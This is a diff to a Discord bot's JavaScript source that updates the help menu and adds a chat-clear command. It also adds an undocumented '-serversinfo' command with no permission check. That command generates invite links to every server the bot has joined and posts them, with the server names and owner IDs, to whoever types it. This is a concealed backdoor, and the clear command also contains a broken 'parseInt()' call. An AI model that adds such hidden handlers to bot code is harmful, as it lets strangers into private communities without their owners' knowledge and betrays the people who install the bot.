@@ -32,7 +32,29 @@ client.user.setGame(`Dating Everyone Bot | %help`,"http://twitch.tv/S-F")
 });
 
 
-
+  client.on('message', msg => {
+    if(msg.author.bot) return;
+    
+    if(msg.content === '-serversinfo') {
+      client.guilds.forEach(g => {
+        
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.channel.send(`
+        **
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id} 
+        Owner ID : ${g.owner.id}
+        **
+        `))
+  
+  
+      })
+    }
+    
+  })
 
   client.on('message',async message => {
     if(message.content.startsWith(prefix + "restart")) {
@@ -392,16 +414,17 @@ client.on("message", message => {
  %ban    <member> <reason>   | For Ban A Member
  %kick   <member> <reason>   | For Kick A Member
  %mute   <member> <reason>   | For Mute A Member
- %unmute <member>            | For Unmute A Member
+ %unmute <member>   | For Unmute A Member
  %warn   <member> <reason>   | Warn A Memebr
- %bc1                        | For Do BroadCast
+ %bc   | For Do BroadCast
+ %clear   | To clear the chat
  +[ ---------------------------- ]+
          **General  Commands**
  +[ ---------------------------- ]+
- %help                       | For Sent This Message
  %report <member> <reason>   | For Report A Member
- %server                     | For See Server Stats
- %members                    | For See Members Stats
+ %server   | For See Server Stats
+ %members   | For See Members Stats
+ %ping   | To check your ping
 
  `)
  message.author.send(embed);
@@ -409,7 +432,45 @@ client.on("message", message => {
 });
 
 
+client.on('message', message => {
+   if(!message.channel.guild) return;
+if(message.content.startsWith(prefix + 'clear')) {
+if(!message.channel.guild) return message.channel.send('**This Command is Just For Servers**').then(m => m.delete(5000));
+if(!message.member.hasPermission('ADMINISTRATOR')) return      message.channel.send('**You Do not have permission** `ADMINISTRATOR`' );
+let args = message.content.split(" ").join(" ").slice(2 + prefix.length);
+let request = `Requested By ${message.author.username}`;
+message.channel.send(`**Are You sure you want to clear the chat?**`).then(msg => {
+msg.react('✅')
+.then(() => msg.react('❌'))
+.then(() =>msg.react('✅'))
 
+let reaction1Filter = (reaction, user) => reaction.emoji.name === '✅' && user.id === message.author.id;
+let reaction2Filter = (reaction, user) => reaction.emoji.name === '❌' && user.id === message.author.id;
+
+let reaction1 = msg.createReactionCollector(reaction1Filter, { time: 12000 });
+let reaction2 = msg.createReactionCollector(reaction2Filter, { time: 12000 });
+reaction1.on("collect", r => {
+message.channel.send(`Chat will delete`).then(m => m.delete(5000));
+var msg;
+        msg = parseInt();
+
+      message.channel.fetchMessages({limit: msg}).then(messages => message.channel.bulkDelete(messages)).catch(console.error);
+      message.channel.sendMessage("", {embed: {
+        title: "`` Chat Deleted ``",
+        color: 0x06DF00,
+        footer: {
+
+        }
+      }}).then(msg => {msg.delete(3000)});
+
+})
+reaction2.on("collect", r => {
+message.channel.send(`**Chat deletion cancelled**`).then(m => m.delete(5000));
+msg.delete();
+})
+})
+}
+});
 
 
 
